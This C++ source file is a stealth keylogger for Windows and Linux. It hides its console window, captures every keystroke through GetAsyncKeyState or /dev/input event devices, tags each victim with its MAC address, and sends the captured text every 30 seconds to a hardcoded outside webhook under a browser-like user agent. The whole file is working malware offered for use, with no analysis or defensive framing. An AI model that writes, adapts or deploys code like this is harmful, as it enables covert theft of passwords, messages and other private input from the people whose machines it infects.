#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <mutex>
#include <sstream>
#include <iomanip>
#include <cstdlib>
#include <ctime>
#include <random>
#include <csignal>
#include <curl/curl.h>
#include <cstring>
#ifdef _WIN32
#include <windows.h>
#include <winsock2.h>
#include <iphlpapi.h>
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#elif __linux__
#include <unistd.h>
#include <sys/socket.h>
#include <ifaddrs.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <dirent.h>
#include <fcntl.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <netpacket/packet.h>
#else
#error "Only Windows and Linux are supported in stealth mode"
#endif

// === GLOBALS ===
std::mutex mtx;
std::string buffer;
std::string clientId;
const std::string WEBHOOK_URL = "https://kl.fmo.qzz.io/webhook";
volatile bool running = true;

// === Helper: Append character silently ===
void logKeystroke(char ch)
{
    if (!ch)
        return;
    std::lock_guard<std::mutex> lock(mtx);
    buffer += ch;
    if (buffer.size() >= 69)
    {
        extern bool sendData(const std::string &);
        if (sendData(buffer))
        {
            buffer.clear();
        }
    }
}

// === Curl callback ===
static size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp)
{
    ((std::string *)userp)->append((char *)contents, size * nmemb);
    return size * nmemb;
}

// === Send data ===
bool sendData(const std::string &data)
{
    if (data.empty())
        return false;
    CURL *curl = curl_easy_init();
    if (!curl)
        return false;

    std::string response;
    curl_mime *mime = curl_mime_init(curl);
    curl_mimepart *part = curl_mime_addpart(mime);
    curl_mime_name(part, "client_id");
    curl_mime_data(part, clientId.c_str(), CURL_ZERO_TERMINATED);
    part = curl_mime_addpart(mime);
    curl_mime_name(part, "data");
    curl_mime_data(part, data.c_str(), CURL_ZERO_TERMINATED);

    curl_easy_setopt(curl, CURLOPT_URL, WEBHOOK_URL.c_str());
    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0");

    CURLcode res = curl_easy_perform(curl);
    bool success = (res == CURLE_OK);

    curl_mime_free(mime);
    curl_easy_cleanup(curl);
    return success;
}

// === Sender thread ===
void senderThread()
{
    while (running)
    {
        std::this_thread::sleep_for(std::chrono::seconds(30));
        std::lock_guard<std::mutex> lock(mtx);
        if (!buffer.empty())
        {
            if (sendData(buffer))
            {
                buffer.clear();
            }
        }
    }
}

// === WINDOWS: Global key capture ===
#ifdef _WIN32

void captureWindows()
{
    // Optional: hide console window (uncomment if needed)
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    BYTE prevKeyState[256] = {0};
    while (running)
    {
        for (int vkey = 0; vkey < 256; ++vkey)
        {
            SHORT state = GetAsyncKeyState(vkey);
            bool isDown = (state & 0x8000) != 0;
            bool wasDown = (prevKeyState[vkey] & 0x80) != 0;

            if (isDown && !wasDown)
            {
                prevKeyState[vkey] = 0x80;

                // Get keyboard state for ToAscii
                BYTE keyboardState[256] = {0};
                GetKeyboardState(keyboardState);

                // Handle special keys
                char ch = 0;
                if (vkey == VK_BACK)
                    ch = '<';
                else if (vkey == VK_RETURN)
                    ch = '\n';
                else if (vkey == VK_SPACE)
                    ch = ' ';
                else if (vkey == VK_TAB)
                    ch = '\t';
                else if (vkey == VK_ESCAPE)
                    ch = '~';
                else if (vkey == VK_DELETE)
                    ch = '>';
                else if (vkey == VK_UP)
                    ch = '^';
                else if (vkey == VK_DOWN)
                    ch = 'v';
                else if (vkey == VK_LEFT)
                    ch = '<';
                else if (vkey == VK_RIGHT)
                    ch = '>';
                else
                {
                    // Try to map to ASCII character
                    WORD charCode;
                    int result = ToAscii(vkey, MapVirtualKeyA(vkey, MAPVK_VK_TO_VSC), keyboardState, &charCode, 0);
                    if (result == 1)
                    {
                        ch = (char)charCode;
                    }
                }
                logKeystroke(ch);
            }
            else if (!isDown)
            {
                prevKeyState[vkey] = 0;
            }
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }
}

// === LINUX: Read from /dev/input/event* ===
#elif __linux__

std::vector<int> findKeyboards()
{
    std::vector<int> fds;
    DIR *dir = opendir("/dev/input");
    if (!dir)
        return fds;

    struct dirent *entry;
    while ((entry = readdir(dir)))
    {
        if (strncmp(entry->d_name, "event", 5) == 0)
        {
            std::string path = "/dev/input/" + std::string(entry->d_name);
            int fd = open(path.c_str(), O_RDONLY | O_NONBLOCK);
            if (fd >= 0)
            {
                unsigned long evbit[EV_MAX / 8] = {0};
                if (ioctl(fd, EVIOCGBIT(0, EV_MAX), evbit) >= 0)
                {
                    if (evbit[EV_KEY / 8] & (1 << (EV_KEY % 8)))
                    {
                        fds.push_back(fd);
                    }
                    else
                    {
                        close(fd);
                    }
                }
                else
                {
                    close(fd);
                }
            }
        }
    }
    closedir(dir);
    return fds;
}

void captureLinux()
{
    auto devices = findKeyboards();
    if (devices.empty())
    {
        running = false;
        return;
    }

    while (running)
    {
        for (int fd : devices)
        {
            struct input_event ev;
            ssize_t n;
            while ((n = read(fd, &ev, sizeof(ev))) == sizeof(ev))
            {
                if (ev.type == EV_KEY && ev.value == 1)
                {
                    char ch = 0;
                    switch (ev.code)
                    {
                    case KEY_BACKSPACE:
                        ch = '<';
                        break;
                    case KEY_ENTER:
                        ch = '\n';
                        break;
                    case KEY_SPACE:
                        ch = ' ';
                        break;
                    case KEY_TAB:
                        ch = '\t';
                        break;
                    case KEY_ESC:
                        ch = '~';
                        break;
                    case KEY_DELETE:
                        ch = '>';
                        break;
                    case KEY_UP:
                        ch = '^';
                        break;
                    case KEY_DOWN:
                        ch = 'v';
                        break;
                    case KEY_LEFT:
                        ch = '<';
                        break;
                    case KEY_RIGHT:
                        ch = '>';
                        break;

                    // Letters
                    case KEY_A:
                        ch = 'a';
                        break;
                    case KEY_B:
                        ch = 'b';
                        break;
                    case KEY_C:
                        ch = 'c';
                        break;
                    case KEY_D:
                        ch = 'd';
                        break;
                    case KEY_E:
                        ch = 'e';
                        break;
                    case KEY_F:
                        ch = 'f';
                        break;
                    case KEY_G:
                        ch = 'g';
                        break;
                    case KEY_H:
                        ch = 'h';
                        break;
                    case KEY_I:
                        ch = 'i';
                        break;
                    case KEY_J:
                        ch = 'j';
                        break;
                    case KEY_K:
                        ch = 'k';
                        break;
                    case KEY_L:
                        ch = 'l';
                        break;
                    case KEY_M:
                        ch = 'm';
                        break;
                    case KEY_N:
                        ch = 'n';
                        break;
                    case KEY_O:
                        ch = 'o';
                        break;
                    case KEY_P:
                        ch = 'p';
                        break;
                    case KEY_Q:
                        ch = 'q';
                        break;
                    case KEY_R:
                        ch = 'r';
                        break;
                    case KEY_S:
                        ch = 's';
                        break;
                    case KEY_T:
                        ch = 't';
                        break;
                    case KEY_U:
                        ch = 'u';
                        break;
                    case KEY_V:
                        ch = 'v';
                        break;
                    case KEY_W:
                        ch = 'w';
                        break;
                    case KEY_X:
                        ch = 'x';
                        break;
                    case KEY_Y:
                        ch = 'y';
                        break;
                    case KEY_Z:
                        ch = 'z';
                        break;

                    // Numbers (top row)
                    case KEY_1:
                        ch = '1';
                        break;
                    case KEY_2:
                        ch = '2';
                        break;
                    case KEY_3:
                        ch = '3';
                        break;
                    case KEY_4:
                        ch = '4';
                        break;
                    case KEY_5:
                        ch = '5';
                        break;
                    case KEY_6:
                        ch = '6';
                        break;
                    case KEY_7:
                        ch = '7';
                        break;
                    case KEY_8:
                        ch = '8';
                        break;
                    case KEY_9:
                        ch = '9';
                        break;
                    case KEY_0:
                        ch = '0';
                        break;

                    // Symbols (USA QWERTY)
                    case KEY_MINUS:
                        ch = '-';
                        break; // -
                    case KEY_EQUAL:
                        ch = '=';
                        break; // =
                    case KEY_LEFTBRACE:
                        ch = '[';
                        break; // [
                    case KEY_RIGHTBRACE:
                        ch = ']';
                        break; // ]
                    case KEY_BACKSLASH:
                        ch = '\\';
                        break; // \
                        case KEY_SEMICOLON: ch = ';'; break; // ;
                    case KEY_APOSTROPHE:
                        ch = '\'';
                        break; // '
                    case KEY_GRAVE:
                        ch = '`';
                        break; // `
                    case KEY_COMMA:
                        ch = ',';
                        break; // ,
                    case KEY_DOT:
                        ch = '.';
                        break; // .
                    case KEY_SLASH:
                        ch = '/';
                        break; // /

                    // Shifted symbols are NOT captured here (requires state)
                    // For full support, track Shift key + map combinations
                    default:
                        break;
                    }
                    logKeystroke(ch);
                }
            }
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }

    for (int fd : devices)
        close(fd);
}

#endif

// === Generate Client ID using MAC address ===
std::string getUniqueClientId()
{
    std::stringstream ss;
    std::vector<unsigned char> mac(6, 0);

#ifdef _WIN32
    // Windows: Get MAC via GetAdaptersInfo
    PIP_ADAPTER_INFO pAdapterInfo = nullptr;
    ULONG bufLen = sizeof(IP_ADAPTER_INFO);
    if (GetAdaptersInfo(nullptr, &bufLen) == ERROR_BUFFER_OVERFLOW)
    {
        pAdapterInfo = (IP_ADAPTER_INFO *)malloc(bufLen);
    }
    else
    {
        pAdapterInfo = (IP_ADAPTER_INFO *)malloc(sizeof(IP_ADAPTER_INFO));
    }
    if (pAdapterInfo && GetAdaptersInfo(pAdapterInfo, &bufLen) == NO_ERROR)
    {
        bool found = false;
        PIP_ADAPTER_INFO adapter = pAdapterInfo;
        while (adapter)
        {
            if (adapter->AddressLength == 6 &&
                (adapter->Type == MIB_IF_TYPE_ETHERNET || adapter->Type == IF_TYPE_IEEE80211))
            {
                std::copy(adapter->Address, adapter->Address + 6, mac.begin());
                found = true;
                break;
            }
            adapter = adapter->Next;
        }
        if (!found)
        {
            // Fallback: use first adapter with 6-byte MAC
            std::copy(pAdapterInfo->Address, pAdapterInfo->Address + 6, mac.begin());
        }
    }
    if (pAdapterInfo)
        free(pAdapterInfo);

#elif __APPLE__
    // macOS: Get MAC via getifaddrs + AF_LINK
    struct ifaddrs *ifap, *ifa;
    if (getifaddrs(&ifap) == 0)
    {
        for (ifa = ifap; ifa; ifa = ifa->ifa_next)
        {
            if (ifa->ifa_addr && ifa->ifa_addr->sa_family == AF_LINK)
            {
                struct sockaddr_dl *sdl = (struct sockaddr_dl *)ifa->ifa_addr;
                if (sdl->sdl_alen == 6)
                {
                    unsigned char *addr = (unsigned char *)LLADDR(sdl);
                    if (addr[0] || addr[1] || addr[2] || addr[3] || addr[4] || addr[5])
                    {
                        std::copy(addr, addr + 6, mac.begin());
                        break;
                    }
                }
            }
        }
        freeifaddrs(ifap);
    }

#elif __linux__
    // Linux: Get MAC via getifaddrs + AF_PACKET
    struct ifaddrs *ifap, *ifa;
    if (getifaddrs(&ifap) == 0)
    {
        for (ifa = ifap; ifa; ifa = ifa->ifa_next)
        {
            if (ifa->ifa_addr && ifa->ifa_addr->sa_family == AF_PACKET)
            {
                struct sockaddr_ll *sll = (struct sockaddr_ll *)ifa->ifa_addr;
                if (sll->sll_halen == 6)
                {
                    if (sll->sll_addr[0] || sll->sll_addr[1] || sll->sll_addr[2] ||
                        sll->sll_addr[3] || sll->sll_addr[4] || sll->sll_addr[5])
                    {
                        std::copy(sll->sll_addr, sll->sll_addr + 6, mac.begin());
                        break;
                    }
                }
            }
        }
        freeifaddrs(ifap);
    }

#else
    // Unsupported platform: leave mac as zeros (will fallback)
#endif

    // Check if MAC is valid (not all zeros)
    bool isValidMac = false;
    for (unsigned char b : mac)
    {
        if (b != 0)
        {
            isValidMac = true;
            break;
        }
    }

    if (!isValidMac)
    {
        // Fallback: generate random MAC-like ID
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 255);
        for (int i = 0; i < 6; ++i)
        {
            mac[i] = static_cast<unsigned char>(dis(gen));
        }
    }

    // Format as hex string
    ss << std::hex << std::setfill('0');
    for (int i = 0; i < 6; ++i)
    {
        if (i > 0)
            ss << ":";
        ss << std::setw(2) << (int)mac[i];
    }
    return ss.str();
}
// === MAIN ===
int main()
{
    std::signal(SIGINT, [](int)
                { running = false; });
    std::signal(SIGTERM, [](int)
                { running = false; });

    clientId = getUniqueClientId();
    curl_global_init(CURL_GLOBAL_DEFAULT);

    std::thread sender(senderThread);

#ifdef _WIN32
    captureWindows();
#elif __linux__
    captureLinux();
#endif

    sender.join();
    curl_global_cleanup();
    return 0;
}